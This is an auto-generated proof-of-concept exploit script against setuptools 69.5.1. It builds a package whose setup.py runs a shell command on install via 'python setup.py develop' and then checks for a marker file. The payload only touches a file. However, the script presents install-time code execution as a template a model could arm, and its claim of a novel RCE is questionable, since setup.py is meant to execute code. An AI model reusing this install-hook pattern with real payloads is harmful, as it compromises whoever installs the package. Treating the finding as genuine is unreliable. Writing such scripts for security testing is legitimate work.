#!/usr/bin/env python3
# PoC for setuptools-69.5.1 (/tmp/bounty_test/setuptools-69.5.1)
# Path: rce-025
# Sink: _execfile
# Auto-generated — run with: python3 rce_code_executes_arbitrary_python__execfile.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for setuptools-69.5.1 RCE vulnerability.

This script demonstrates that an attacker who can control a package being installed
(via a malicious setup.py) can achieve arbitrary code execution. The vulnerability
exists because setuptools executes setup.py via exec() without sandboxing code execution
(DirectorySandbox only restricts file system operations).

The PoC creates a malicious package with a setup.py that executes a benign payload
(touches /tmp/poc_success.txt), then triggers the vulnerable code path by installing
the package using setuptools' develop command.
"""

import os
import sys
import tempfile
import shutil
import subprocess
import textwrap

# Configuration
TARGET_DIR = "/tmp/bounty_test/setuptools-69.5.1"
PACKAGE_NAME = "poc_malicious_package"
PAYLOAD_FILE = "/tmp/poc_success.txt"

def create_malicious_package(base_dir):
    """Create a minimal Python package with a malicious setup.py."""
    pkg_dir = os.path.join(base_dir, PACKAGE_NAME)
    os.makedirs(pkg_dir, exist_ok=True)
    
    # Create setup.py with benign payload
    setup_py_content = textwrap.dedent(f'''\
    import os
    # Benign payload: create a marker file to prove code execution
    os.system("touch {PAYLOAD_FILE}")
    
    from setuptools import setup
    setup(
        name="{PACKAGE_NAME}",
        version="0.0.1",
        packages=[],
    )
    ''')
    
    setup_py_path = os.path.join(pkg_dir, "setup.py")
    with open(setup_py_path, "w") as f:
        f.write(setup_py_content)
    
    # Create minimal __init__.py
    init_py_path = os.path.join(pkg_dir, "__init__.py")
    with open(init_py_path, "w") as f:
        f.write("# empty\n")
    
    return pkg_dir

def trigger_vulnerability(package_dir):
    """
    Trigger the vulnerable code path by running:
    python setup.py develop
    
    This calls the 'run' entry point -> install_for_development -> ... -> _execfile
    which executes setup.py via exec().
    """
    original_dir = os.getcwd()
    os.chdir(package_dir)
    
    try:
        # Add setuptools to path if needed
        sys.path.insert(0, TARGET_DIR)
        
        # Run setup.py develop to trigger the vulnerable code path
        result = subprocess.run(
            [sys.executable, "setup.py", "develop"],
            capture_output=True,
            text=True,
            timeout=30,
            cwd=package_dir
        )
        
        print(f"[*] setup.py develop stdout:\n{result.stdout}")
        if result.stderr:
            print(f"[*] setup.py develop stderr:\n{result.stderr}")
        
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        os.chdir(original_dir)

def main():
    print("[*] Setuptools RCE PoC")
    print(f"[*] Target setuptools: {TARGET_DIR}")
    print(f"[*] Payload: touch {PAYLOAD_FILE}")
    print()
    
    # Clean up any previous payload file
    if os.path.exists(PAYLOAD_FILE):
        os.remove(PAYLOAD_FILE)
    
    # Create temporary directory for malicious package
    temp_dir = tempfile.mkdtemp(prefix="poc_setuptools_")
    print(f"[*] Created temporary directory: {temp_dir}")
    
    try:
        # Step 1: Create malicious package
        print("[*] Creating malicious package...")
        pkg_dir = create_malicious_package(temp_dir)
        print(f"[*] Package created at: {pkg_dir}")
        print(f"[*] setup.py content:")
        with open(os.path.join(pkg_dir, "setup.py")) as f:
            print(f.read())
        
        # Step 2: Trigger the vulnerability
        print("[*] Triggering vulnerability via 'python setup.py develop'...")
        success = trigger_vulnerability(pkg_dir)
        
        # Step 3: Check if payload executed
        if os.path.exists(PAYLOAD_FILE):
            print(f"\n[+] SUCCESS! Payload file created: {PAYLOAD_FILE}")
            print("[+] Code execution achieved!")
            print("[+] The malicious setup.py was executed via exec() in _execfile")
            print("[+] DirectorySandbox did NOT prevent code execution")
        else:
            print(f"\n[-] Payload file not found: {PAYLOAD_FILE}")
            print("[-] Code execution may not have occurred")
            if success:
                print("[-] Command succeeded but payload didn't execute - check logs")
            else:
                print("[-] Command failed - check error messages above")
    
    finally:
        # Clean up
        print(f"\n[*] Cleaning up temporary directory: {temp_dir}")
        shutil.rmtree(temp_dir, ignore_errors=True)
        if os.path.exists(PAYLOAD_FILE):
            os.remove(PAYLOAD_FILE)

if __name__ == "__main__":
    main()
